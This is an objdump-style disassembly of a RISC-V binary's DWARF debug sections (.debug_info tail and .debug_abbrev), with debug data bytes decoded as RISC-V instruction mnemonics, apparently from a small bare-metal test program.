    21b4:	0200                	addi	s0,sp,256
    21b6:	1aec0643          	fmadd.d	fa2,fs8,fa4,ft3,rne
    21ba:	8000                	0x8000
    21bc:	0000                	unimp
    21be:	0000                	unimp
    21c0:	0018                	0x18
    21c2:	0000                	unimp
    21c4:	0000                	unimp
    21c6:	0000                	unimp
    21c8:	9c01                	subw	s0,s0,s0
    21ca:	1335                	addi	t1,t1,-19
    21cc:	0000                	unimp
    21ce:	1e32                	slli	t3,t3,0x2c
    21d0:	02000007          	0x2000007
    21d4:	00490f43          	fmadd.s	ft10,fs2,ft4,ft0,rne
    21d8:	0000                	unimp
    21da:	9102                	jalr	sp
    21dc:	006c                	addi	a1,sp,12
    21de:	b12e                	fsd	fa1,160(sp)
    21e0:	0006                	c.slli	zero,0x1
    21e2:	0200                	addi	s0,sp,256
    21e4:	213e                	fld	ft2,456(sp)
    21e6:	009d                	addi	ra,ra,7
    21e8:	0000                	unimp
    21ea:	1ad0                	addi	a2,sp,372
    21ec:	8000                	0x8000
    21ee:	0000                	unimp
    21f0:	0000                	unimp
    21f2:	001c                	0x1c
    21f4:	0000                	unimp
    21f6:	0000                	unimp
    21f8:	0000                	unimp
    21fa:	9c01                	subw	s0,s0,s0
    21fc:	1385                	addi	t2,t2,-31
    21fe:	0000                	unimp
    2200:	5532                	lw	a0,44(sp)
    2202:	0006                	c.slli	zero,0x1
    2204:	0200                	addi	s0,sp,256
    2206:	373e                	fld	fa4,488(sp)
    2208:	009d                	addi	ra,ra,7
    220a:	0000                	unimp
    220c:	9102                	jalr	sp
    220e:	3368                	fld	fa0,224(a4)
    2210:	7065                	c.lui	zero,0xffff9
    2212:	3e020063          	beqz	tp,25f2 <_tbss_end+0x256e>
    2216:	9d48                	0x9d48
    2218:	0000                	unimp
    221a:	0200                	addi	s0,sp,256
    221c:	6091                	lui	ra,0x4
    221e:	9b32                	add	s6,s6,a2
    2220:	0006                	c.slli	zero,0x1
    2222:	0200                	addi	s0,sp,256
    2224:	573e                	lw	a4,236(sp)
    2226:	0c30                	addi	a2,sp,536
    2228:	0000                	unimp
    222a:	9102                	jalr	sp
    222c:	0058                	addi	a4,sp,4
    222e:	7141                	addi	sp,sp,-496
    2230:	0008                	0x8
    2232:	0200                	addi	s0,sp,256
    2234:	2038                	fld	fa4,64(s0)
    2236:	1ab0                	addi	a2,sp,376
    2238:	8000                	0x8000
    223a:	0000                	unimp
    223c:	0000                	unimp
    223e:	0020                	addi	s0,sp,8
    2240:	0000                	unimp
    2242:	0000                	unimp
    2244:	0000                	unimp
    2246:	9c01                	subw	s0,s0,s0
    2248:	000013b3          	sll	t2,zero,zero
    224c:	1e32                	slli	t3,t3,0x2c
    224e:	02000007          	0x2000007
    2252:	3638                	fld	fa4,104(a2)
    2254:	009d                	addi	ra,ra,7
    2256:	0000                	unimp
    2258:	9102                	jalr	sp
    225a:	0068                	addi	a0,sp,12
    225c:	a43e                	fsd	fa5,8(sp)
    225e:	0008                	0x8
    2260:	0200                	addi	s0,sp,256
    2262:	0628                	addi	a0,sp,776
    2264:	19a0                	addi	s0,sp,248
    2266:	8000                	0x8000
    2268:	0000                	unimp
    226a:	0000                	unimp
    226c:	0110                	addi	a2,sp,128
    226e:	0000                	unimp
    2270:	0000                	unimp
    2272:	0000                	unimp
    2274:	9c01                	subw	s0,s0,s0
    2276:	00001477          	0x1477
    227a:	da32                	sw	a2,52(sp)
    227c:	0006                	c.slli	zero,0x1
    227e:	0200                	addi	s0,sp,256
    2280:	1328                	addi	a0,sp,424
    2282:	0049                	c.nop	18
    2284:	0000                	unimp
    2286:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    228a:	6934                	ld	a3,80(a0)
    228c:	0200                	addi	s0,sp,256
    228e:	072a                	slli	a4,a4,0xa
    2290:	0049                	c.nop	18
    2292:	0000                	unimp
    2294:	9102                	jalr	sp
    2296:	2b5c                	fld	fa5,144(a4)
    2298:	19b0                	addi	a2,sp,248
    229a:	8000                	0x8000
    229c:	0000                	unimp
    229e:	0000                	unimp
    22a0:	007c                	addi	a5,sp,12
    22a2:	0000                	unimp
    22a4:	0000                	unimp
    22a6:	0000                	unimp
    22a8:	1434                	addi	a3,sp,552
    22aa:	0000                	unimp
    22ac:	6334                	ld	a3,64(a4)
    22ae:	02007273          	csrrci	tp,0x20,0
    22b2:	0332                	slli	t1,t1,0xc
    22b4:	009d                	addi	ra,ra,7
    22b6:	0000                	unimp
    22b8:	9102                	jalr	sp
    22ba:	2c68                	fld	fa0,216(s0)
    22bc:	19be                	slli	s3,s3,0x2f
    22be:	8000                	0x8000
    22c0:	0000                	unimp
    22c2:	0000                	unimp
    22c4:	000c                	0xc
    22c6:	0000                	unimp
    22c8:	0000                	unimp
    22ca:	0000                	unimp
    22cc:	2324                	fld	fs1,64(a4)
    22ce:	0002                	c.slli64	zero
    22d0:	0200                	addi	s0,sp,256
    22d2:	0332                	slli	t1,t1,0xc
    22d4:	0079                	c.nop	30
    22d6:	0000                	unimp
    22d8:	9102                	jalr	sp
    22da:	0050                	addi	a2,sp,4
    22dc:	2c00                	fld	fs0,24(s0)
    22de:	1a2c                	addi	a1,sp,312
    22e0:	8000                	0x8000
    22e2:	0000                	unimp
    22e4:	0000                	unimp
    22e6:	007c                	addi	a5,sp,12
    22e8:	0000                	unimp
    22ea:	0000                	unimp
    22ec:	0000                	unimp
    22ee:	6334                	ld	a3,64(a4)
    22f0:	02007273          	csrrci	tp,0x20,0
    22f4:	009d0333          	add	t1,s10,s1
    22f8:	0000                	unimp
    22fa:	9102                	jalr	sp
    22fc:	2c60                	fld	fs0,216(s0)
    22fe:	1a3a                	slli	s4,s4,0x2e
    2300:	8000                	0x8000
    2302:	0000                	unimp
    2304:	0000                	unimp
    2306:	000c                	0xc
    2308:	0000                	unimp
    230a:	0000                	unimp
    230c:	0000                	unimp
    230e:	2324                	fld	fs1,64(a4)
    2310:	0002                	c.slli64	zero
    2312:	0200                	addi	s0,sp,256
    2314:	00790333          	add	t1,s2,t2
    2318:	0000                	unimp
    231a:	9102                	jalr	sp
    231c:	0048                	addi	a0,sp,4
    231e:	0000                	unimp
    2320:	8038                	0x8038
    2322:	02000007          	0x2000007
    2326:	1212                	slli	tp,tp,0x24
    2328:	009d                	addi	ra,ra,7
    232a:	0000                	unimp
    232c:	1922                	slli	s2,s2,0x28
    232e:	8000                	0x8000
    2330:	0000                	unimp
    2332:	0000                	unimp
    2334:	007e                	c.slli	zero,0x1f
    2336:	0000                	unimp
    2338:	0000                	unimp
    233a:	0000                	unimp
    233c:	9c01                	subw	s0,s0,s0
    233e:	14ea                	slli	s1,s1,0x3a
    2340:	0000                	unimp
    2342:	b832                	fsd	fa2,48(sp)
    2344:	02000007          	0x2000007
    2348:	2412                	fld	fs0,256(sp)
    234a:	009d                	addi	ra,ra,7
    234c:	0000                	unimp
    234e:	7ef89103          	lh	sp,2031(a7)
    2352:	6b32                	ld	s6,264(sp)
    2354:	02000007          	0x2000007
    2358:	3412                	fld	fs0,288(sp)
    235a:	008c                	addi	a1,sp,64
    235c:	0000                	unimp
    235e:	7ef09103          	lh	sp,2031(ra) # 47ef <_tbss_end+0x476b>
    2362:	7032                	0x7032
    2364:	02000007          	0x2000007
    2368:	4312                	lw	t1,4(sp)
    236a:	008c                	addi	a1,sp,64
    236c:	0000                	unimp
    236e:	7ee89103          	lh	sp,2030(a7)
    2372:	7532                	ld	a0,296(sp)
    2374:	02000007          	0x2000007
    2378:	5212                	lw	tp,36(sp)
    237a:	008c                	addi	a1,sp,64
    237c:	0000                	unimp
    237e:	7ee09103          	lh	sp,2030(ra)
    2382:	6742                	ld	a4,16(sp)
    2384:	0008                	0x8
    2386:	0200                	addi	s0,sp,256
    2388:	1514                	addi	a3,sp,672
    238a:	14fa                	slli	s1,s1,0x3e
    238c:	0000                	unimp
    238e:	0240                	addi	s0,sp,260
    2390:	007f                	0x7f
    2392:	0a00                	addi	s0,sp,272
    2394:	0098                	addi	a4,sp,64
    2396:	0000                	unimp
    2398:	14fa                	slli	s1,s1,0x3e
    239a:	0000                	unimp
    239c:	0000790b          	0x790b
    23a0:	0700                	addi	s0,sp,896
    23a2:	0400                	addi	s0,sp,512
    23a4:	14ea                	slli	s1,s1,0x3a
    23a6:	0000                	unimp
    23a8:	2338                	fld	fa4,64(a4)
    23aa:	01000007          	0x1000007
    23ae:	1172                	slli	sp,sp,0x3c
    23b0:	008c                	addi	a1,sp,64
    23b2:	0000                	unimp
    23b4:	18ec                	addi	a1,sp,124
    23b6:	8000                	0x8000
    23b8:	0000                	unimp
    23ba:	0000                	unimp
    23bc:	0036                	c.slli	zero,0xd
    23be:	0000                	unimp
    23c0:	0000                	unimp
    23c2:	0000                	unimp
    23c4:	9c01                	subw	s0,s0,s0
    23c6:	153e                	slli	a0,a0,0x2f
    23c8:	0000                	unimp
    23ca:	01007833          	and	a6,zero,a6
    23ce:	1f72                	slli	t5,t5,0x3c
    23d0:	008c                	addi	a1,sp,64
    23d2:	0000                	unimp
    23d4:	9102                	jalr	sp
    23d6:	3458                	fld	fa4,168(s0)
    23d8:	6962                	ld	s2,24(sp)
    23da:	0074                	addi	a3,sp,12
    23dc:	7401                	lui	s0,0xfffe0
    23de:	8c0c                	0x8c0c
    23e0:	0000                	unimp
    23e2:	0200                	addi	s0,sp,256
    23e4:	6891                	lui	a7,0x4
    23e6:	4300                	lw	s0,0(a4)
    23e8:	06a9                	addi	a3,a3,10
    23ea:	0000                	unimp
    23ec:	5e01                	li	t3,-32
    23ee:	00186227          	0x186227
    23f2:	0080                	addi	s0,sp,64
    23f4:	0000                	unimp
    23f6:	8a00                	0x8a00
    23f8:	0000                	unimp
    23fa:	0000                	unimp
    23fc:	0000                	unimp
    23fe:	0100                	addi	s0,sp,128
    2400:	a49c                	fsd	fa5,8(s1)
    2402:	0015                	c.nop	5
    2404:	3200                	fld	fs0,32(a2)
    2406:	07d8                	addi	a4,sp,964
    2408:	0000                	unimp
    240a:	5e01                	li	t3,-32
    240c:	00004933          	xor	s2,zero,zero
    2410:	0200                	addi	s0,sp,256
    2412:	6c91                	lui	s9,0x4
    2414:	5724                	lw	s1,104(a4)
    2416:	0008                	0x8
    2418:	0100                	addi	s0,sp,128
    241a:	1760                	addi	s0,sp,940
    241c:	0050                	addi	a2,sp,4
    241e:	0000                	unimp
    2420:	0309                	addi	t1,t1,2
    2422:	b4a4                	fsd	fs1,104(s1)
    2424:	8001                	c.srli64	s0
    2426:	0000                	unimp
    2428:	0000                	unimp
    242a:	a824                	fsd	fs1,80(s0)
    242c:	0004                	0x4
    242e:	0100                	addi	s0,sp,128
    2430:	1761                	addi	a4,a4,-8
    2432:	0050                	addi	a2,sp,4
    2434:	0000                	unimp
    2436:	0309                	addi	t1,t1,2
    2438:	b4a0                	fsd	fs0,104(s1)
    243a:	8001                	c.srli64	s0
    243c:	0000                	unimp
    243e:	0000                	unimp
    2440:	0008513b          	srlw	sp,a6,zero
    2444:	0100                	addi	s0,sp,128
    2446:	1762                	slli	a4,a4,0x38
    2448:	0049                	c.nop	18
    244a:	0000                	unimp
    244c:	3800                	fld	fs0,48(s0)
    244e:	0788                	addi	a0,sp,960
    2450:	0000                	unimp
    2452:	4e01                	li	t3,0
    2454:	490c                	lw	a1,16(a0)
    2456:	0000                	unimp
    2458:	4000                	lw	s0,0(s0)
    245a:	00800017          	auipc	zero,0x800
    245e:	0000                	unimp
    2460:	2200                	fld	fs0,0(a2)
    2462:	0001                	nop
    2464:	0000                	unimp
    2466:	0000                	unimp
    2468:	0100                	addi	s0,sp,128
    246a:	6a9c                	ld	a5,16(a3)
    246c:	0016                	c.slli	zero,0x5
    246e:	3300                	fld	fs0,32(a4)
    2470:	006e                	c.slli	zero,0x1b
    2472:	4e01                	li	t3,0
    2474:	491d                	li	s2,7
    2476:	0000                	unimp
    2478:	0300                	addi	s0,sp,384
    247a:	bc91                	j	1ece <_tbss_end+0x1e4a>
    247c:	327f                	0x327f
    247e:	085d                	addi	a6,a6,23
    2480:	0000                	unimp
    2482:	4e01                	li	t3,0
    2484:	00166a37          	lui	s4,0x166
    2488:	0300                	addi	s0,sp,384
    248a:	b091                	j	1cce <_tbss_end+0x1c4a>
    248c:	327f                	0x327f
    248e:	08b6                	slli	a7,a7,0xd
    2490:	0000                	unimp
    2492:	4e01                	li	t3,0
    2494:	0016814b          	fnmsub.s	ft2,fa3,ft1,ft0,rne
    2498:	0300                	addi	s0,sp,384
    249a:	a891                	j	24ee <_tbss_end+0x246a>
    249c:	347f                	0x347f
    249e:	0069                	c.nop	26
    24a0:	5001                	c.li	zero,-32
    24a2:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    24a6:	0200                	addi	s0,sp,256
    24a8:	6c91                	lui	s9,0x4
    24aa:	5a2c                	lw	a1,112(a2)
    24ac:	00800017          	auipc	zero,0x800
    24b0:	0000                	unimp
    24b2:	9c00                	0x9c00
    24b4:	0000                	unimp
    24b6:	0000                	unimp
    24b8:	0000                	unimp
    24ba:	3400                	fld	fs0,40(s0)
    24bc:	3074                	fld	fa3,224(s0)
    24be:	0100                	addi	s0,sp,128
    24c0:	0c54                	addi	a3,sp,532
    24c2:	1670                	addi	a2,sp,812
    24c4:	0000                	unimp
    24c6:	9102                	jalr	sp
    24c8:	3460                	fld	fs0,232(s0)
    24ca:	3174                	fld	fa3,224(a0)
    24cc:	0100                	addi	s0,sp,128
    24ce:	1a54                	addi	a3,sp,308
    24d0:	1670                	addi	a2,sp,812
    24d2:	0000                	unimp
    24d4:	9102                	jalr	sp
    24d6:	3458                	fld	fa4,168(s0)
    24d8:	3076                	fld	ft0,376(sp)
    24da:	0100                	addi	s0,sp,128
    24dc:	0c55                	addi	s8,s8,21
    24de:	1670                	addi	a2,sp,812
    24e0:	0000                	unimp
    24e2:	9102                	jalr	sp
    24e4:	3450                	fld	fa2,168(s0)
    24e6:	3176                	fld	ft2,376(sp)
    24e8:	0100                	addi	s0,sp,128
    24ea:	1c55                	addi	s8,s8,-11
    24ec:	1670                	addi	a2,sp,812
    24ee:	0000                	unimp
    24f0:	9102                	jalr	sp
    24f2:	3448                	fld	fa0,168(s0)
    24f4:	7165                	addi	sp,sp,-400
    24f6:	0031                	c.nop	12
    24f8:	5601                	li	a2,-32
    24fa:	4909                	li	s2,2
    24fc:	0000                	unimp
    24fe:	0200                	addi	s0,sp,256
    2500:	4491                	li	s1,4
    2502:	6534                	ld	a3,72(a0)
    2504:	3271                	addiw	tp,tp,-4
    2506:	0100                	addi	s0,sp,128
    2508:	1956                	slli	s2,s2,0x35
    250a:	0049                	c.nop	18
    250c:	0000                	unimp
    250e:	9102                	jalr	sp
    2510:	0040                	addi	s0,sp,4
    2512:	1200                	addi	s0,sp,288
    2514:	7c08                	ld	a0,56(s0)
    2516:	0016                	c.slli	zero,0x5
    2518:	0200                	addi	s0,sp,256
    251a:	0408                	addi	a0,sp,512
    251c:	034a                	slli	t1,t1,0x12
    251e:	0000                	unimp
    2520:	7005                	c.lui	zero,0xfffe1
    2522:	0016                	c.slli	zero,0x5
    2524:	0400                	addi	s0,sp,512
    2526:	00001677          	0x1677
    252a:	0812                	slli	a6,a6,0x4
    252c:	00001677          	0x1677
    2530:	b638                	fsd	fa4,104(a2)
    2532:	0008                	0x8
    2534:	0100                	addi	s0,sp,128
    2536:	0c3e                	slli	s8,s8,0xf
    2538:	0049                	c.nop	18
    253a:	0000                	unimp
    253c:	1636                	slli	a2,a2,0x2d
    253e:	8000                	0x8000
    2540:	0000                	unimp
    2542:	0000                	unimp
    2544:	010a                	slli	sp,sp,0x2
    2546:	0000                	unimp
    2548:	0000                	unimp
    254a:	0000                	unimp
    254c:	9c01                	subw	s0,s0,s0
    254e:	172d                	addi	a4,a4,-21
    2550:	0000                	unimp
    2552:	01006e33          	or	t3,zero,a6
    2556:	173e                	slli	a4,a4,0x2f
    2558:	0049                	c.nop	18
    255a:	0000                	unimp
    255c:	9102                	jalr	sp
    255e:	324c                	fld	fa1,160(a2)
    2560:	085d                	addi	a6,a6,23
    2562:	0000                	unimp
    2564:	3e01                	addiw	t3,t3,-32
    2566:	2d2e                	fld	fs10,200(sp)
    2568:	02000017          	auipc	zero,0x2000
    256c:	4091                	li	ra,4
    256e:	b632                	fsd	fa2,296(sp)
    2570:	0008                	0x8
    2572:	0100                	addi	s0,sp,128
    2574:	3f3e                	fld	ft10,488(sp)
    2576:	00001733          	sll	a4,zero,zero
    257a:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    257e:	6934                	ld	a3,80(a0)
    2580:	0100                	addi	s0,sp,128
    2582:	0740                	addi	s0,sp,900
    2584:	0049                	c.nop	18
    2586:	0000                	unimp
    2588:	9102                	jalr	sp
    258a:	2c6c                	fld	fa1,216(s0)
    258c:	1650                	addi	a2,sp,804
    258e:	8000                	0x8000
    2590:	0000                	unimp
    2592:	0000                	unimp
    2594:	0080                	addi	s0,sp,64
    2596:	0000                	unimp
    2598:	0000                	unimp
    259a:	0000                	unimp
    259c:	7434                	ld	a3,104(s0)
    259e:	0030                	addi	a2,sp,8
    25a0:	4401                	li	s0,0
    25a2:	4909                	li	s2,2
    25a4:	0000                	unimp
    25a6:	0200                	addi	s0,sp,256
    25a8:	6891                	lui	a7,0x4
    25aa:	7434                	ld	a3,104(s0)
    25ac:	0031                	c.nop	12
    25ae:	4401                	li	s0,0
    25b0:	00004917          	auipc	s2,0x4
    25b4:	0200                	addi	s0,sp,256
    25b6:	6491                	lui	s1,0x4
    25b8:	7634                	ld	a3,104(a2)
    25ba:	0030                	addi	a2,sp,8
    25bc:	4501                	li	a0,0
    25be:	4909                	li	s2,2
    25c0:	0000                	unimp
    25c2:	0200                	addi	s0,sp,256
    25c4:	6091                	lui	ra,0x4
    25c6:	7634                	ld	a3,104(a2)
    25c8:	0031                	c.nop	12
    25ca:	4501                	li	a0,0
    25cc:	4919                	li	s2,6
    25ce:	0000                	unimp
    25d0:	0200                	addi	s0,sp,256
    25d2:	5c91                	li	s9,-28
    25d4:	0000                	unimp
    25d6:	0812                	slli	a6,a6,0x4
    25d8:	0055                	c.nop	21
    25da:	0000                	unimp
    25dc:	0812                	slli	a6,a6,0x4
    25de:	005a                	c.slli	zero,0x16
    25e0:	0000                	unimp
    25e2:	00074843          	fmadd.s	fa6,fa4,ft0,ft0,rmm
    25e6:	0100                	addi	s0,sp,128
    25e8:	161a0d33          	0x161a0d33
    25ec:	8000                	0x8000
    25ee:	0000                	unimp
    25f0:	0000                	unimp
    25f2:	001c                	0x1c
    25f4:	0000                	unimp
    25f6:	0000                	unimp
    25f8:	0000                	unimp
    25fa:	9c01                	subw	s0,s0,s0
    25fc:	00001783          	lh	a5,0(zero) # 0 <_tdata_begin>
    2600:	3432                	fld	fs0,296(sp)
    2602:	0006                	c.slli	zero,0x1
    2604:	0100                	addi	s0,sp,128
    2606:	064a2933          	0x64a2933
    260a:	0000                	unimp
    260c:	9102                	jalr	sp
    260e:	3368                	fld	fa0,224(a4)
    2610:	006e                	c.slli	zero,0x1b
    2612:	3301                	addiw	t1,t1,-32
    2614:	4935                	li	s2,13
    2616:	0000                	unimp
    2618:	0200                	addi	s0,sp,256
    261a:	6491                	lui	s1,0x4
    261c:	72726133          	0x72726133
    2620:	0100                	addi	s0,sp,128
    2622:	16814533          	0x16814533
    2626:	0000                	unimp
    2628:	9102                	jalr	sp
    262a:	0058                	addi	a4,sp,4
    262c:	4a44                	lw	s1,20(a2)
    262e:	0006                	c.slli	zero,0x1
    2630:	0100                	addi	s0,sp,128
    2632:	0d28                	addi	a0,sp,664
    2634:	15fe                	slli	a1,a1,0x3f
    2636:	8000                	0x8000
    2638:	0000                	unimp
    263a:	0000                	unimp
    263c:	001c                	0x1c
    263e:	0000                	unimp
    2640:	0000                	unimp
    2642:	0000                	unimp
    2644:	9c01                	subw	s0,s0,s0
    2646:	3432                	fld	fs0,296(sp)
    2648:	0006                	c.slli	zero,0x1
    264a:	0100                	addi	s0,sp,128
    264c:	2328                	fld	fa0,64(a4)
    264e:	064a                	slli	a2,a2,0x12
    2650:	0000                	unimp
    2652:	9102                	jalr	sp
    2654:	3368                	fld	fa0,224(a4)
    2656:	006e                	c.slli	zero,0x1b
    2658:	2801                	sext.w	a6,a6
    265a:	0000492f          	0x492f
    265e:	0200                	addi	s0,sp,256
    2660:	6491                	lui	s1,0x4
    2662:	72726133          	0x72726133
    2666:	0100                	addi	s0,sp,128
    2668:	3c28                	fld	fa0,120(s0)
    266a:	00001733          	sll	a4,zero,zero
    266e:	9102                	jalr	sp
    2670:	0058                	addi	a4,sp,4
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	390b3b0b          	0x390b3b0b
  28:	0013490b          	0x13490b
  2c:	0400                	addi	s0,sp,512
  2e:	0024                	addi	s1,sp,8
  30:	0b3e0b0b          	0xb3e0b0b
  34:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  38:	1605                	addi	a2,a2,-31
  3a:	0300                	addi	s0,sp,384
  3c:	3a0e                	fld	fs4,224(sp)
  3e:	39053b0b          	0x39053b0b
  42:	0013490b          	0x13490b
  46:	0600                	addi	s0,sp,768
  48:	0b0b0117          	auipc	sp,0xb0b0
  4c:	0b3a                	slli	s6,s6,0xe
  4e:	0b390b3b          	0xb390b3b
  52:	1301                	addi	t1,t1,-32
  54:	0000                	unimp
  56:	03000d07          	0x3000d07
  5a:	3a0e                	fld	fs4,224(sp)
  5c:	390b3b0b          	0x390b3b0b
  60:	0013490b          	0x13490b
  64:	0800                	addi	s0,sp,16
  66:	0101                	addi	sp,sp,0
  68:	1349                	addi	t1,t1,-14
  6a:	1301                	addi	t1,t1,-32
  6c:	0000                	unimp
  6e:	2109                	addiw	sp,sp,2
  70:	4900                	lw	s0,16(a0)
  72:	000b2f13          	slti	t5,s6,0
  76:	0a00                	addi	s0,sp,272
  78:	0b0b0113          	addi	sp,s6,176
  7c:	0b3a                	slli	s6,s6,0xe
  7e:	0b390b3b          	0xb390b3b
  82:	1301                	addi	t1,t1,-32
  84:	0000                	unimp
  86:	03000d0b          	0x3000d0b
  8a:	3a0e                	fld	fs4,224(sp)
  8c:	390b3b0b          	0x390b3b0b
  90:	3813490b          	0x3813490b
  94:	0c00000b          	0xc00000b
  98:	0b0b000f          	0xb0b000f
  9c:	0000                	unimp
  9e:	130d                	addi	t1,t1,-29
  a0:	0301                	addi	t1,t1,0
  a2:	0b0e                	slli	s6,s6,0x3
  a4:	3b0b3a0b          	0x3b0b3a0b
  a8:	010b390b          	0x10b390b
  ac:	0e000013          	li	zero,224
  b0:	000d                	c.nop	3
  b2:	0b3a0803          	lb	a6,179(s4) # 1660b3 <_tbss_end+0x16602f>
  b6:	0b390b3b          	0xb390b3b
  ba:	1349                	addi	t1,t1,-14
  bc:	0b38                	addi	a4,sp,408
  be:	0000                	unimp
  c0:	0b000f0f          	0xb000f0f
  c4:	0013490b          	0x13490b
  c8:	1000                	addi	s0,sp,32
  ca:	0e030113          	addi	sp,t1,224
  ce:	0b3a050b          	0xb3a050b
  d2:	0b390b3b          	0xb390b3b
  d6:	1301                	addi	t1,t1,-32
  d8:	0000                	unimp
  da:	0d11                	addi	s10,s10,4
  dc:	0300                	addi	s0,sp,384
  de:	3a0e                	fld	fs4,224(sp)
  e0:	390b3b0b          	0x390b3b0b
  e4:	3813490b          	0x3813490b
  e8:	0005                	c.nop	1
  ea:	1200                	addi	s0,sp,288
  ec:	0015                	c.nop	5
  ee:	00001927          	0x1927
  f2:	27011513          	0x27011513
  f6:	4919                	li	s2,6
  f8:	00130113          	addi	sp,t1,1
  fc:	1400                	addi	s0,sp,544
  fe:	0005                	c.nop	1
 100:	1349                	addi	t1,t1,-14
 102:	0000                	unimp
 104:	2615                	addiw	a2,a2,5
 106:	4900                	lw	s0,16(a0)
 108:	16000013          	li	zero,352
 10c:	0e030113          	addi	sp,t1,224
 110:	0b3a050b          	0xb3a050b
 114:	0b39053b          	0xb39053b
 118:	1301                	addi	t1,t1,-32
 11a:	0000                	unimp
 11c:	03000d17          	auipc	s10,0x3000
 120:	3a0e                	fld	fs4,224(sp)
 122:	39053b0b          	0x39053b0b
 126:	3813490b          	0x3813490b
 12a:	1800000b          	0x1800000b
 12e:	000d                	c.nop	3
 130:	0b3a0e03          	lb	t3,179(s4)
 134:	0b39053b          	0xb39053b
 138:	1349                	addi	t1,t1,-14
 13a:	0538                	addi	a4,sp,648
 13c:	0000                	unimp
 13e:	1319                	addi	t1,t1,-26
 140:	0301                	addi	t1,t1,0
 142:	0b0e                	slli	s6,s6,0x3
 144:	3b0b3a0b          	0x3b0b3a0b
 148:	3905                	addiw	s2,s2,-31
 14a:	0013010b          	0x13010b
 14e:	1a00                	addi	s0,sp,304
 150:	0b0b0113          	addi	sp,s6,176
 154:	0b3a                	slli	s6,s6,0xe
 156:	0b39053b          	0xb39053b
 15a:	1301                	addi	t1,t1,-32
 15c:	0000                	unimp
 15e:	0b01131b          	0xb01131b
 162:	3a05                	addiw	s4,s4,-31
 164:	39053b0b          	0x39053b0b
 168:	0013010b          	0x13010b
 16c:	1c00                	addi	s0,sp,560
 16e:	050b0117          	auipc	sp,0x50b0
 172:	0b3a                	slli	s6,s6,0xe
 174:	0b39053b          	0xb39053b
 178:	1301                	addi	t1,t1,-32
 17a:	0000                	unimp
 17c:	0d1d                	addi	s10,s10,7
 17e:	0300                	addi	s0,sp,384
 180:	3a0e                	fld	fs4,224(sp)
 182:	39053b0b          	0x39053b0b
 186:	0013490b          	0x13490b
 18a:	1e00                	addi	s0,sp,816
 18c:	0e030013          	addi	zero,t1,224
 190:	193c                	addi	a5,sp,184
 192:	0000                	unimp
 194:	151f 2701 0119      	0x1192701151f
 19a:	20000013          	li	zero,512
 19e:	0034                	addi	a3,sp,8
 1a0:	0b3a0e03          	lb	t3,179(s4)
 1a4:	0b39053b          	0xb39053b
 1a8:	1349                	addi	t1,t1,-14
 1aa:	193c193f 34210000 	0x34210000193c193f
 1b2:	0300                	addi	s0,sp,384
 1b4:	3a0e                	fld	fs4,224(sp)
 1b6:	390b3b0b          	0x390b3b0b
 1ba:	3f13490b          	0x3f13490b
 1be:	3c19                	addiw	s8,s8,-26
 1c0:	0019                	c.nop	6
 1c2:	2200                	fld	fs0,0(a2)
 1c4:	0021                	c.nop	8
 1c6:	1349                	addi	t1,t1,-14
 1c8:	0000062f          	0x62f
 1cc:	03003423          	sd	a6,40(zero) # 28 <_tdata_begin+0x28>
 1d0:	3a0e                	fld	fs4,224(sp)
 1d2:	390b3b0b          	0x390b3b0b
 1d6:	3f13490b          	0x3f13490b
 1da:	0219                	addi	tp,tp,6
 1dc:	0018                	0x18
 1de:	2400                	fld	fs0,8(s0)
 1e0:	0021                	c.nop	8
 1e2:	1349                	addi	t1,t1,-14
 1e4:	0000052f          	0x52f
 1e8:	2e25                	addiw	t3,t3,9
 1ea:	3f01                	addiw	t5,t5,-32
 1ec:	0319                	addi	t1,t1,6
 1ee:	3a0e                	fld	fs4,224(sp)
 1f0:	390b3b0b          	0x390b3b0b
 1f4:	4919270b          	0x4919270b
 1f8:	12011113          	0x12011113
 1fc:	96184007          	flq	ft0,-1695(a6)
 200:	1942                	slli	s2,s2,0x30
 202:	1301                	addi	t1,t1,-32
 204:	0000                	unimp
 206:	3426                	fld	fs0,104(sp)
 208:	0300                	addi	s0,sp,384
 20a:	3a0e                	fld	fs4,224(sp)
 20c:	390b3b0b          	0x390b3b0b
 210:	0213490b          	0x213490b
 214:	0018                	0x18
 216:	2700                	fld	fs0,8(a4)
 218:	0111010b          	0x111010b
 21c:	0712                	slli	a4,a4,0x4
 21e:	0000                	unimp
 220:	3428                	fld	fa0,104(s0)
 222:	0300                	addi	s0,sp,384
 224:	3a08                	fld	fa0,48(a2)
 226:	390b3b0b          	0x390b3b0b
 22a:	0213490b          	0x213490b
 22e:	0018                	0x18
 230:	2900                	fld	fs0,16(a0)
 232:	0111010b          	0x111010b
 236:	0712                	slli	a4,a4,0x4
 238:	1301                	addi	t1,t1,-32
 23a:	0000                	unimp
 23c:	2e2a                	fld	ft8,136(sp)
 23e:	3f01                	addiw	t5,t5,-32
 240:	0319                	addi	t1,t1,6
 242:	3a0e                	fld	fs4,224(sp)
 244:	390b3b0b          	0x390b3b0b
 248:	1119270b          	0x1119270b
 24c:	1201                	addi	tp,tp,-32
 24e:	97184007          	flq	ft0,-1679(a6)
 252:	1942                	slli	s2,s2,0x30
 254:	1301                	addi	t1,t1,-32
 256:	0000                	unimp
 258:	0300052b          	0x300052b
 25c:	3a08                	fld	fa0,48(a2)
 25e:	390b3b0b          	0x390b3b0b
 262:	0213490b          	0x213490b
 266:	0018                	0x18
 268:	2c00                	fld	fs0,24(s0)
 26a:	0005                	c.nop	1
 26c:	0b3a0e03          	lb	t3,179(s4)
 270:	0b390b3b          	0xb390b3b
 274:	1349                	addi	t1,t1,-14
 276:	1802                	slli	a6,a6,0x20
 278:	0000                	unimp
 27a:	2e2d                	addiw	t3,t3,11
 27c:	3f01                	addiw	t5,t5,-32
 27e:	0319                	addi	t1,t1,6
